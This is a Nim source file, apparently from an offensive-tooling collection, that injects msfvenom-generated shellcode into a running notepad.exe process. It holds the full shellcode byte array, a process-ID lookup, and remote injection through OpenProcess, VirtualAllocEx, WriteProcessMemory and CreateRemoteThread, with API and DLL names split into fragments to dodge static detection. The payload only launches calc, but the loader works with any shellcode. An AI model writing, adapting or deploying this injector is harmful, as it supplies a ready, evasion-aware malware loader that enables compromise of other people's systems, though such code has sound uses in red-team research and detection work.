#[
  Reference: https://github.com/NotoriousRebel/NimbleMusings/blob/master/injector_nim/dynlib_crtinjection.nim

  - Performs similar actions as the local inject, but dynamically resolves APIs at runtime
  - Also looks up a process ID by the name and opens a handle to it
  - After that, performs normal remote process injection with VirtualAlloc, WriteProcessMemory, and CreateRemoteThread

  NOTE: Seems to consistently crash the target process, though the shellcode still stays running and the process appears to restart.

]#

import dynlib
import winim

# msfvenom -p windows/x64/exec cmd="calc" -f csharp
var shellcode: array[272, byte] = [
  byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,
  0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
  0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
  0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
  0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
  0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
  0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
  0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
  0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
  0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
  0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
  0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
  0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
  0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
  0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
  0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
  0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
  0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
  0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
  0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
  0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
  0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
  0x63,0x00]

# Take in character array and create a single string
proc toString(chars: openArray[WCHAR]): string =
  result = ""
  for c in chars:
    if cast[char](c) == '\0':
      break
    result.add(cast[char](c))

# Use CreateToolhelp32Snapshot to loop through all current processes and find the ID for a specific process name
proc findProcessID(process_name: string): DWORD =
  var
    pid: DWORD = 0
    entry: PROCESSENTRY32
    hSnapshot: HANDLE

  entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
  defer: CloseHandle(hSnapshot)

  if Process32First(hSnapshot, addr entry):
    while Process32Next(hSnapshot, addr entry):
      if entry.szExeFile.toString == process_name:
        pid = entry.th32ProcessID
        break

  return pid

# Define type templates for the needed WinApi functions
# OP = OpenProcess
# VAL = VirtualAlloc
# WPM = WriteProcessMemory
# CRT = CreateRemoteThread      
type 
  OP* = proc(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, dwProcessId: DWORD): HANDLE {.stdcall.}
  VAL* = proc(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID {.stdcall.}
  WPM* = proc(hProcess: HANDLE, lpBaseAddress: LPVOID, lpBuffer: LPCVOID, nSize: SIZE_T, lpNumberOfBytesWritten: ptr SIZE_T): WINBOOL {.stdcall.}
  CRT* = proc(hProcess: HANDLE, lpThreadAttributes: LPSECURITY_ATTRIBUTES, dwStackSize: SIZE_T, lpStartAddress: LPTHREAD_START_ROUTINE, lpParameter: LPVOID, dwCreationFlags: DWORD, lpThreadId: LPDWORD): HANDLE {.stdcall.}

# Use loadLib (LoadLibrary) to load kernel32.dll into memory for the APIs we need to use
let lib = loadLib(r"C:\Win" & r"dows\Sys" & r"tem32\" & "ker" & "nel" & "32." & "d" & "ll")
if lib != nil:
  let note_pid = findProcessID("notepad.exe")

  # If notepad.exe running, use type templates to call regular injection APIs
  if note_pid != 0:
    let op = cast[OP](lib.symAddr("Ope" & "nP" & "rocess"))
    let handle = op(0x001F0FFF, false, note_pid)
    echo "handle: ", handle
    let alloc = cast[VAL](lib.symAddr("Virtua" & "lAllo" & "cE" & "x"))
    let allocRes = alloc(handle, NULL, (SIZE_T)uint(shellcode.len), 12288, 0x40)
    echo "has been alloced"
    let writep = cast[WPM](lib.symAddr("Writ" & "eProces" & "sMemo" & "ry"))
    let writeres = writep(handle, allocRes, unsafeAddr shellcode, (SIZE_T)uint(shellcode.len), NULL)
    let temp = cast[LPTHREAD_START_ROUTINE](allocRes)
    let xx = cast[CRT](lib.symAddr("Creat" & "eRemot" & "eThre" & "ad"))
    discard xx(handle, NULL, 0, temp, NULL, 0, NULL)
    echo "thread created"
  else:
    echo "error"
  